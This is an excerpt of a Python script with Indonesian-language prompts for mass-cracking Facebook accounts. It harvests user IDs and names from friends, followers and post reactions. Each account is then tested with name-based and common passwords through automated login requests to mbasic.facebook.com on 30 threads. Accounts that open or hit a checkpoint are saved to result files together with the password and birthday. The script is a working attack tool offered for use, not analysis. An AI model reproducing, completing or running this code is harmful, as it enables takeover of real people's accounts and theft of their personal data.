...
def menu():
	...
	if ask =="":
		...
		if ask =="":
			...
			try:
				okj = open("results/OK-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
				print(" "+N+"[#]------------------------------------------") 
				print(" "+N+"[+] Results OK Date : %s-%s-%s"%(ha, op, ta(okj)))
			...
			try:
				cpk = open("results/CP-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
				print(" "+N+"[#]------------------------------------------") 
				print(" "+N+"[+] Results CP Date : %s-%s-%s"%(ha, op, ta(cpk)))
...
def indo():
	...
	print(" "+N+"[!] Default password : name123,name1234,name12345,bismillah,sayang,indonesia")
	print(" "+N+"[!] Selain password default, gunakan methode Manual.")
	print(" "+N+"[!] Ketik ctrl+z untuk berhenti crack.")
	...
	def main(user):
		...
		sys.stdout.write(
		      '\r'+N+'[%s] Cracking [ %s/%s ] ' % (datetime.now().strftime('%H:%M:%S'), loop, len(id))
		); sys.stdout.flush()
		uid,name=user.split("|")
		try:
			os.mkdir('results')
			...
			pass
		try:
			for pw in [name.lower()+'123',name.lower()+'1234',name.lower()+'12345',name.lower(),'bismillah','sayang','indonesia']:
				...
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					...
					try:
						...
						save.write(' '+K+' '+str(uid)+'|'+str(pw)+'|'+ttl+'\n')
						save.close()
						break
					except(KeyError, IOError):
						ttl = " "
	...
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n "+N+"</-> Your CP results saved in : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
...
def celek():
	...
	print(" "+N+"[*] Total IDs  : "+str(len(id)))
	print(" "+N+"[!] Ketik ctrl+z untuk berhenti crack.")
	print("\n "+N+"[!] Crack menggunakan 9 list sandi.")
	print(" "+N+"-----------------------------------------------")
	...
	def main(user):
		...
		try:
			...
			pass
		try:
			for pw in [name.lower()+'123',name.lower()+'1234',name.lower()+'12345',name.lower(),name.lower()+'786','111222','102030','445566','786786']:
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r '+H+'[OK] '+N+uid+ '|' + pw + '                  ')
...
def followers():
	...
	for i in z["data"]:
		...
		id.append(uid+'|'+nm)
	print(" "+N+"[+] Total IDs  : "+str(len(id)))
	print(" "+N+"[!] Default password : name123,name1234,name12345,firstname")
	print(" "+N+"[!] Selain password default, gunakan methode Manual.")
	print(" "+N+"[!] Ketik ctrl+z untuk berhenti crack.")
	ask = raw_input("\n "+N+"[?] Want to Use a Manual Password? Y/n : ")
	if ask == "Y" or ask == "y":
...
def reaction():
	...
	for i in z["data"]:
		...
		id.append(uid+'|'+nm)
	print(" "+N+"[*] Total IDs  : "+str(len(id)))
	print(" "+N+"[!] Default password : name123,name1234,name12345,firstname,freefire,freefire123")
	print(" "+N+"[!] Selain password default, gunakan methode Manual.")
	print(" "+N+"[!] Ketik ctrl+z untuk berhenti crack.")
	ask = raw_input("\n "+N+"[?] Want to Use a Manual Password? Y/n : ")
	if ask == "Y" or ask == "y":
	...
	def main(user):
		...
		try:
			...
			pass
		try:
			for pw in [name.lower()+'123',name.lower()+'1234',name.lower()+'12345',name.lower(),'freefire','freefire123']:
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r '+H+'[OK] '+N+uid+ '|' + pw + '                  ')
...
def manual():
	print(" "+N+"[*] Exp : indonesia,anying,doraemon,freefire")
	...
	def main(user):
		...
		try:
			for ahya in pw:
				...
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r '+H+'[OK] '+N+'' +uid+ '|' + ahya + '                  ')
					ok.append(uid+'|'+ahya)
					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(str(uid)+'|'+str(ahya)+'\n')
					save.close()
					break
					continue
				elif 'checkpoint' in xo:
					try:
						...
						ttl = data['birthday'].replace("/","-")
						nama = data['name']
						cp.append(uid+'|'+ahya+'|'+ttl)
						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
						save.write(' '+K+' '+str(uid)+'|'+str(ahya)+'|'+ttl+'\n')
						save.close()
						break
					except(KeyError, IOError):
						ttl = " "
					except:pass
					print('\r'+K+'[CP] '+N+'' +uid+ ' |' + ahya + ' |' + ttl)
					cp.append(uid+'|'+ahya)
					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(' '+K+' '+str(uid)+'|'+str(ahya)+'\n')
					save.close()
					break
					continue
